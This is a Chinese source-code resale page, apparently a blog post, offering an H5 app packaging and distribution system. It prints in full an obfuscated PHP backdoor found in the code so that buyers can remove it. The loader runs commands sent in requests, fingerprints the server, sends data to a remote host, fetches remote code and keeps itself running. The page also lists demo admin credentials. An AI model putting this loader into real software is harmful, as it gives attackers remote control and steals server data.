#1ba1e2;overflow:hidden;margin:10px 0;padding:15px 15px 15px 35px}#user-content-sc_black{border-width:1px 4px 4px 1px;border-style:solid;border-color:#3e3e3e;margin:10px 0;padding:15px 15px 15px 35px}#user-content-sc_xuk{border:2px dashed rgb(41,170,227);background-color:rgb(248,247,245);margin:10px 0;padding:15px 15px 15px 35px}#user-content-sc_lvb{margin:10px 0;padding:10px 15px;border:1px solid #e3e3e3;border-left:2px solid #05B536;background:#FFF}#user-content-sc_redb{margin:10px 0;padding:10px 15px;border:1px solid #e3e3e3;border-left:2px solid #ED0505;background:#FFF}#user-content-sc_organge{margin:10px 0;padding:10px 15px;border:1px solid #e3e3e3;border-left:2px solid #EC8006;background:#FFF}#user-content-sc_fankui{color:#fff;background:#00bd3f url('/static/img/sc_error.png') -1px -1px no-repeat;border:1px solid #00bd3f;overflow:hidden;padding:6px;border-radius:5px;width:6rem;text-align:center;font-size:13pt;margin-bottom:8px}#user-content-sc_shuoming{color:#fff;background:#ff4545 url('/static/img/sc_error.png') -1px -1px no-repeat;border:1px solid #ff4545;overflow:hidden;padding:6px;border-radius:5px;width:6rem;text-align:center;font-size:13pt;margin-bottom:8px}#user-content-sc_jietu{color:#fff;background:#35b8e0 url('/static/img/sc_error.png') -1px -1px no-repeat;border:1px solid #35b8e0;overflow:hidden;padding:6px;border-radius:5px;width:6rem;text-align:center;font-size:13pt;margin-bottom:8px}.article-content p{padding:15px;background:#f8f9fa;border-radius:5px}#user-content-timibbs12{display:flex;flex-wrap:wrap}#user-content-timibbs12 p{display:contents;width:33.33%}#user-content-timibbs15{color:#ffffff;background:#FF5722;border:1px solid #FF5722;overflow:hidden;padding:6px;border-radius:5px;width:6rem;text-align:center;font-size:13pt;margin:3% 43%}.post-content .aligncenter{border-radius:12px;padding:5px;display:block;clear:both;margin:0 auto}#user-content-timibbs12 a{color:#03a9f4;flex:1 0 33.33%;padding:3px;display:flex;margin-bottom:5px;}#user-content-sc_error b{display:block;margin-top:5px;}#user-content-announcement{border:1px solid #ddd;padding:20px;margin:30px 0 10px;background-color:#f9f9f9;border-radius:15px;font-family:Arial,sans-serif;text-align: center;}#user-content-announcement h2{color:#007bff;margin:0 0 10px;}#user-content-announcement p{margin:0;font-size:1.1rem;color:#333;}#user-content-announcement a{color:#007bff;text-decoration:none;}</style><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.4/css/lightbox.min.css" />
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">【亲测】仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php</h1>
+<div class="title-right">
+    <a href="https://wukongymw.github.io/wukongymw/" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/wukongymw/wukongymw/issues/497" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><div id="user-content-announcement"><div>
+ <h2>重要公告</h2>
+    <p>
+        加入我们的 Telegram 群组以获取最新消息和支持！ 
+        <br>
+        📢 <a href="https://t.me/wukongym" rel="nofollow">点击这里加入 TG 群</a>
+        <br><br>
+        如需帮助，请联系唯一客服：
+        <br>
+        🤖 <a href="https://t.me/wukongymw" rel="nofollow">点击这里联系客服</a>
+    </p>
+  </div>
+</div>
+<div id="user-content-sc_error">本套程序已经过悟空源码技术人员测试，如需搭建请直接联系客服：<a href="http://t.me/wukongymw" rel="nofollow">@wukongymw</a>
+<b>解压密码：wukongymw.com</b></div>
+<div id="user-content-sc_shuoming">源码说明</div>
+仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php
+<div id="user-content-sc_fankui">测试反馈</div>
+测试环境：Linux系统CentOS7.6、宝塔面板、Nginx、PHP7.2、MySQL5.7，运行目录选择public，伪静态看下面，建议开启SSL
+<p>这是一套修复过的全开源版本，基础页面全都点开测试过了，没有发现明显bug，因为没时间部署签名打包环境以及没钱买证书，所以没有测试签名和打包的流程，有条件的自行测试</p>
+<p>搭建也是很简单的，我找了以前版本的搭建文档，你们可以对照着弄一下</p>
+<p>这套用D盾没扫出马，加密也没扫出来，但是检查代码发现了shell，绝大多数论坛源码都存在这个后门，以 ;$b11st=0; 开始 ;$b11ed=0; 结束的这一段代码全都删掉，完整的如下：</p>
+<pre class="notranslate"><code class="notranslate">;$b11st=0;
+$l0ader=function($check){$sl=array(0x6578706c,0x6f646500,0x62617365,0x36345f64,0x65636f64,0x65006a73,0x6f6e5f64,0x65636f64,0x6500696d,0x706c6f64,0x65006172,0x7261795f,0x73686966,0x74007374,0x72726576,0x00737562,0x73747200,0x7374726c,0x656e0073,0x7472746f,0x6c6f7765,0x72006973,0x5f617272,0x61790070,0x6f736978,0x5f676574,0x70777569,0x64006765,0x745f6375,0x7272656e,0x745f7573,0x65720066,0x756e6374,0x696f6e5f,0x65786973,0x74730070,0x68705f73,0x6170695f,0x6e616d65,0x00706870,0x5f756e61,0x6d650070,0x68707665,0x7273696f,0x6e006765,0x74686f73,0x746e616d,0x65006677,0x72697465,0x0066696c,0x655f6765,0x745f636f,0x6e74656e,0x74730066,0x696c655f,0x7075745f,0x636f6e74,0x656e7473,0x006d745f,0x72616e64,0x00737472,0x65616d5f,0x736f636b,0x65745f63,0x6c69656e,0x74007379,0x735f6765,0x745f7465,0x6d705f64,0x69720070,0x6f736978,0x5f676574,0x75696400,0x63686d6f,0x64007469,0x6d650064,0x6566696e,0x65640063,0x6f6e7374,0x616e7400,0x696e695f,0x67657400,0x67657463,0x77640069,0x6e747661,0x6c00677a,0x756e636f,0x6d707265,0x73730068,0x7474705f,0x6275696c,0x645f7175,0x65727900,0x70636e74,0x6c5f666f,0x726b0070,0x636e746c,0x5f776169,0x74706964,0x00706f73,0x69785f73,0x65747369,0x6400636c,0x695f7365,0x745f7072,0x6f636573,0x735f7469,0x746c6500,0x66636c6f,0x73650073,0x6c656570,0x00756e6c,0x696e6b00,0x69676e6f,0x72655f75,0x7365725f,0x61626f72,0x74007265,0x67697374,0x65725f73,0x68757464,0x6f776e5f,0x66756e63,0x74696f6e,0x00736574,0x5f657272,0x6f725f68,0x616e646c,0x65720065,0x72726f72,0x5f726570,0x6f727469,0x6e670066,0x61737463,0x67695f66,0x696e6973,0x685f7265,0x71756573,0x74006973,0x5f726573,0x6f757263,0x65000050,0x44397761,0x48416761,0x57596f49,0x575a3162,0x6d4e3061,0x57397558,0x32563461,0x584e3063,0x79676958,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a41694b,0x536c375a,0x6e567559,0x33527062,0x32346758,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a416f4a,0x474d7065,0x79526b49,0x4430675a,0x585a6862,0x43676b59,0x796b374a,0x47453959,0x584a7959,0x586b6f4a,0x4751704f,0x334a6c64,0x48567962,0x69426863,0x6e4a6865,0x56397a61,0x476c6d64,0x43676b59,0x536b3766,0x58303700,0x5f5f7275,0x6e5f636f,0x64655f78,0x3230002f,0x73657373,0x5f7a7a69,0x75646272,0x6f726b64,0x61646869,0x70393076,0x396a6d6a,0x00fef100,0x01006457,0x52774f69,0x3876646a,0x49774c6e,0x526f6157,0x35726347,0x68774d53,0x356a6232,0x30364f54,0x6b344f41,0x3d3d0061,0x48523063,0x446f764c,0x3359794d,0x43353061,0x476c7561,0x33426f63,0x44457559,0x3239744c,0x3359794d,0x43397062,0x6d6c3050,0x773d3d00,0x6e6f6368,0x65636b30,0x00643200,0x69007500,0x74006869,0x64007069,0x6400636c,0x69007769,0x6e005048,0x505f4f53,0x006e616d,0x65005553,0x45520044,0x4f43554d,0x454e545f,0x524f4f54,0x00646973,0x61626c65,0x5f66756e,0x6374696f,0x6e730048,0x5454505f,0x434f4f4b,0x49450048,0x5454505f,0x484f5354,0x00534352,0x4950545f,0x4e414d45,0x00524551,0x55455354,0x5f555249,0x006c7600,0x677a0075,0x64005732,0x74336233,0x4a725a58,0x49764d44,0x6f775345,0x35640053,0x54444f55,0x54005354,0x44455252,0x00000000);;$r=false;foreach($sl as $d)$r.=chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;24).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;16).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;8).chr($d);$f=substr($r,0,7);$f=$f(chr(0),$r);$g=$GLOBALS;$r=$_REQUEST;$s=$_SERVER;$l1i=isset($r[$f[55]])?$l1i=@$r[$f[55]]:0;$l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$l1i=@$f[2]($f[1]($f[5]($l1i)));if($l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$f[9]($l1i)){$w=$f[4]($l1i);$fu=$f[4]($l1i);die($w($fu==$f[56]?include($l1i[0]):$fu($l1i[0],$l1i[1])));}$uid=$f[12]($f[23])?@$f[23]():-1;$cli=($f[13]()==$f[61]);$os=$f[26]($f[63])?$f[27]($f[63]):$f[46];$sfile=$f[49];$sfile[2]='s';$sfile[3]='e';$sfile=$f[22]().$sfile;$pfile=$f[22]().$f[49];if( $f[8]($f[6]($os,0,3))==$f[62] ){$pfile.=$f[11]();$sfile.=$f[11]();}$hu=isset($s[$f[65]])?$s[$f[65]]:$f[11]();if($f[12]($f[10])&amp;amp;amp;amp;&amp;amp;amp;amp;$uid!=-1){$pu=$f[10]($uid);$hu=$pu?($pu[$f[64]]?:$hu):$hu;};$idfile=$sfile.$f[59];$hid = @($f[18]($idfile));if(!$hid){$hid=$f[25]().$f[20](100,999);if(@$f[19]($idfile,$hid)){@$f[24]($idfile,0666);}else{$hid=0;}}$pid=0;$pwd = $cli?$f[29]():$s[$f[66]];$extra=$cli?$f[28]($f[67]):@$s[$f[68]];$extra=$extra?$f[6]($extra,0,1024):$f[46];$hv=substr($f[14](),0,128);$uri=@$s[$f[71]];$uri=$uri?$f[6]($uri,0,128):$f[46];$rdata=array(chr(23),$os,$f[16](),$hv,$uid,$hu,$hid,$pid,$f[13](),$f[15](),$pwd,@$s[$f[69]],@$s[$f[70]],$uri,$extra);$tf=$pfile.$f[57].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$ok=(@$f[19]($tf,$f[25]()+7200)&amp;amp;amp;gt;0);@$f[24]($tf,0666);if($f[12]($f[21])){$ud=$f[6]($f[3](chr(0),$rdata),0,1400);@$f[17]($f[21]($f[1]($f[52]),$e1s, $e2s,5),$f[50].$f[51].$ud);}if(!$ok)return;$tf=$pfile.$f[56].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$a=array($pfile);if(@$f[19]($a[0],$f[1]($f[47]))&amp;amp;amp;gt;0){@include_once($pfile);}else{@$f[39]($a[0]);return;};@$f[39]($a[0]);$gz=$f[12]($f[31]);$go=function($lv)use($f,$gz,$rdata,$sfile){try{$rdata[6]=@$f[18]($sfile.$f[59]);$rdata[7]=@$f[18]($sfile.$f[60]);$d=@$f[32](array($f[74]=&amp;amp;amp;gt;$f[51].$f[3](chr(0),$rdata),$f[72]=&amp;amp;amp;gt;$lv,$f[73]=&amp;amp;amp;gt;$gz,$f[58]=&amp;amp;amp;gt;$f[25]()));$data=@$f[18]($f[1]($f[53]).$d);if($data &amp;amp;amp;amp;&amp;amp;amp;amp; $gz)$data=@$f[31]($data);if($data)@$f[48]($data);return true;}catch(\Exception $e){}catch(\Throwable $e){}};if($cli){$hwai=$f[12]($f[34]);$pid=-1;if($f[12]($f[33]))$pid=$f[33]();if($pid&amp;amp;amp;lt;0){$go(3);return;}if($pid&amp;amp;amp;gt;0){return $hwai&amp;amp;amp;amp;&amp;amp;amp;amp;$f[34]($pid,$s);}if($hwai &amp;amp;amp;amp;&amp;amp;amp;amp; $f[33]() )die;if($f[12]($f[35]))@$f[35]();if($f[12]($f[36]))@$f[36]($f[1]($f[75]));try{if($f[26]($f[76]))@$f[37]($f[27]($f[76]));if($f[26]($f[77]))@$f[37]($f[27]($f[77]));}catch(\Exception $e){}catch(\Throwable $e){};$nt0=0;do{if($f[25]()&amp;amp;amp;gt;$nt0){$nt0=$f[25]()+3600;@$f[19]($tf,$f[25]()+7200);@$go(4);}$f[38](60);}while(1);die;}else{$f[40](true);$f[41](function() use($f,$go){$f[42](function(){});$f[43](0);if($f[12]($f[44])){$f[44]();$go(2);}else{$go(1);}});}};set_error_handler(function(){});$error1=error_reporting();error_reporting(0);try{@$l0ader(true);}catch(\Exception $e){}catch(\Throwable $e){}error_reporting($error1);restore_error_handler();
+;$b11ed=0;
+</code></pre>
+<p> </p>
+<p>能检测到的马儿已经清理干净了，你们自己还是得扫一下啊</p>
+<p>清理后也可以拿去运营，新加了文件快传的功能，整体感觉比以前的要好得多</p>
+<p>数据库修改：/source/system/config.inc.php 和 /source/system/db_config.php 里面将 wukong_di8qu 改成你自己的，或者你自己设置账号密码都为 wukong_di8qu 即可<br>
+伪静态：</p>
+<pre class="notranslate"><code class="notranslate">location / {
+	if (!-e $request_filename){
+	rewrite  ^(.*)$  /index.php$1  last;   break;
+	}
+}
+</code></pre>
+<p> </p>
+<p>前端：<a href="https://di8qu.wkym.cc" rel="nofollow">https://di8qu.wkym.cc</a><br>
+测试账号：18888888888<br>
+密码：123456</p>
+<p>后台：<a href="https://di8qu.wkym.cc/admin.php" rel="nofollow">https://di8qu.wkym.cc/admin.php</a><br>
+账号：admin<br>
+密码：wukongymw.com</p>
+<div id="user-content-sc_jietu">截图展示</div>
+<div id="user-content-timibbs15">前端</div>
+<div id="user-content-timibbs12">
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png" rel="nofollow"><img src="https://camo.githubusercontent.com/5aba29247d73212df45e4e01c3f7860efe39b5c96eeb3734713221d49bc7831e/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3462313035356630326431656635352e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png" style="max-width: 100%;"></a><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png" rel="nofollow"><img src="https://camo.githubusercontent.com/de6aba2d18b3a6f9898fc92c1c6d7797f2b8fdebc6de76db3cae5071dba407f0/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3138666361333561383731336338372e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png" style="max-width: 100%;"></a></p>
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png" rel="nofollow"><img src="https://camo.githubusercontent.com/ab783a073e18ca13a18b0bb6a3bd76790425fcd10e385c535f704d1ea70272a4/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3536363166643232376637636565632e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png" style="max-width: 100%;"></a></p>
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png" rel="nofollow"><img src="https://camo.githubusercontent.com/d00f68b370fac2996dbdf11da0b350fd1a7618b77c8b98d2863085f9a3c0934f/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3563353235626432316438633364342e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png" style="max-width: 100%;"></a></p>
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png" rel="nofollow"><img src="https://camo.githubusercontent.com/ac2a740de94e70c49301ed83dbd43d650c535de5cec8775d3c18d37488816fe3/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f6535653430623266623464666161632e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png" style="max-width: 100%;"></a></p>
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png" rel="nofollow"><img src="https://camo.githubusercontent.com/2fcb89c63a344b36d59345abecf1705455aae0838b1fac828de54bebc197f1b9/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3462393161643666633265643938632e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png" style="max-width: 100%;"></a></p>
+</div>
+<div id="user-content-timibbs15">后台</div>
+<div id="user-content-timibbs12">
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png" rel="nofollow"><img src="https://camo.githubusercontent.com/da39d21d0bdc3ae57b166cf0c89e3732cbc28524b7ac1ef3415ecff38e86913c/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3766646632653839363739633239352e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png" style="max-width: 100%;"></a><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png" rel="nofollow"><img src="https://camo.githubusercontent.com/41d3490558a9bf478164f90bac47d5aa7f0039a70e611dc1ef4a8509f25c87ea/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f3737653334613435366532646364302e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png" style="max-width: 100%;"></a></p>
+<p><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png" rel="nofollow"><img src="https://camo.githubusercontent.com/d7953af605ef19a24d1f9e6e92a9dfc44c290d822d70fa2e071b5d684809377a/68747470733a2f2f63646e2e77756b6f6e67796d772e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032352f30332f6131396364303632336431313930342e706e67" alt="" data-canonical-src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png" style="max-width: 100%;"></a></p>
+</div>
+</div>
+<div style="font-size:small;margin-top:8px;float:right;">转载请注明出处-悟空源码网 wukongymw.com</div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://wukongymw.github.io/wukongymw/">悟空源码网 wkym.cc</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("02/16/2021"!=""){
+    var startSite=new Date("02/16/2021");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.4/js/lightbox.min.js"></script>
+
+</html>
